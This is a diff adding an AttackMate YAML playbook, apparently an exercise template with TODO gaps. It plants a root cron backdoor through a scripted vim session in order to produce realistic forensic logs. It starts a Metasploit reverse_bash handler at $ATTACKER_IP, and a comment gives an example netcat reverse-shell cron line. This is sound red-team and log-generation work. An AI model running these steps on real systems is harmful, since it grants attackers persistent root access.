@@ -1,0 +1,114 @@
+# Phase 5b: Persistence - Cron Backdoor (via interactive vim session)
+#
+# Alternative to persist_cron.yml. Instead of writing the cron file with a
+# single echo command, this module opens vim and edits the file interactively
+# - exactly as a human attacker would do at a keyboard.
+#
+# Why this matters for realistic log generation:
+#   A plain `echo '...' > /etc/cron.d/backdoor` leaves a very scripted-looking
+#   line in shell history and audit logs. A vim session produces a sequence of
+#   interactive keystrokes with typical editing pauses. To a defender reading
+#   logs, the vim approach looks far more like a real operator than a script.
+#   This is one of AttackMate's key strengths: generating human-realistic
+#   forensic evidence.
+#
+# How vim interaction works through msf-session:
+#   Each cmd string is sent to the session as typed input.
+#   IMPORTANT: Commands that must be "submitted" by pressing Enter (vim ex
+#   commands like :wq!) must end with \n. Without \n the command is typed into
+#   vim but never executed - the session just hangs waiting for Enter.
+#
+# Variables required: $SESSION_NAME, $ATTACKER_IP, $LPORT
+# ATT&CK: T1053.003 (Scheduled Task/Job: Cron)
+#
+# LPORT: use 4445 (port 4444 is already in use by the entry session).
+# CLEANUP: Remove /etc/cron.d/backdoor after the exercise.
+
+commands:
+
+  # Step 1: Start a listener BEFORE writing the cron file so it is ready when
+  # the first callback fires (within 60 seconds of the cron entry being saved).
+  - type: msf-module
+    cmd: exploit/multi/handler
+    creates_session: cron_callback
+    payload: cmd/unix/reverse_bash
+    payload_options:
+      LHOST: $ATTACKER_IP
+      LPORT: "4445"
+    background: true
+    kill_on_exit: true
+    metadata:
+      tactic: "TA0011"
+      technique: "T1095"
+      technique_name: "Non-Application Layer Protocol"
+
+  # Step 2: Escalate to a proper bash shell if the session is a limited shell.
+  - type: msf-session
+    session: $SESSION_NAME
+    cmd: /bin/bash -p
+
+  # Step 3: Open vim on the new cron drop file.
+  # The file does not exist yet - vim will create it on save.
+  # TODO: Fill in the vim command to open /etc/cron.d/backdoor.
+  - type: msf-session
+    session: $SESSION_NAME
+    cmd: # TODO
+
+  # Step 4: Remap "jj" to Escape in insert mode.
+  # This lets us exit insert mode by typing jj instead of sending a raw ESC
+  # byte, which is harder to express cleanly in a YAML string.
+  # TODO: Fill in the vim ex command (:inoremap jj <ESC>).
+  - type: msf-session
+    session: $SESSION_NAME
+    cmd: ":inoremap jj <ESC>"
+
+  # Step 5: Enter insert mode so we can type the cron content.
+  - type: msf-session
+    session: $SESSION_NAME
+    cmd: #TODO
+
+  # Step 6: Type the cron entry.
+  # Format: * * * * * root <command>
+  # The command must produce a reverse shell back to $ATTACKER_IP on $LPORT.
+  # will fre every 60 seconds (not a realistic backdoor, but it ensures the callback will arrive within 60 seconds of saving
+  # TODO: Fill in the full cron line.
+  #   Example using netcat:
+  #     * * * * * root nc $ATTACKER_IP $LPORT -e /bin/bash
+  - type: msf-session
+    session: $SESSION_NAME
+    cmd: # TODO
+    metadata:
+      tactic: "TA0003"
+      technique: "T1053.003"
+      technique_name: "Scheduled Task/Job: Cron"
+
+  # Step 7: Exit insert mode using the jj shortcut we set up in step 4.
+  - type: msf-session
+    session: $SESSION_NAME
+    cmd: jj
+
+  # Step 8: Save and quit vim.
+  # IMPORTANT: The \n at the end is required. Without it, ":wq!" is typed into
+  # the vim command line but never executed - the session will hang waiting for
+  # Enter. Every vim ex command that must run needs a trailing \n.
+  # TODO: Fill in the vim write-quit command (remember the \n).
+  - type: msf-session
+    session: $SESSION_NAME
+    cmd: # TODO:
+    metadata:
+      tactic: "TA0003"
+      technique: "T1053.003"
+      technique_name: "Scheduled Task/Job: Cron"
+
+  - type: debug
+    cmd: "Cron file written via vim. Listener running - waiting for callback"
+
+  # Step 9: Verify the callback arrived and confirm root access.
+  - type: msf-session
+    session: cron_callback
+    cmd: id
+
+  # CLEANUP: uncomment to remove the backdoor cron entry
+  # - type: msf-session
+  #   session: $SESSION_NAME
+  #   cmd: "rm /etc/cron.d/backdoor"
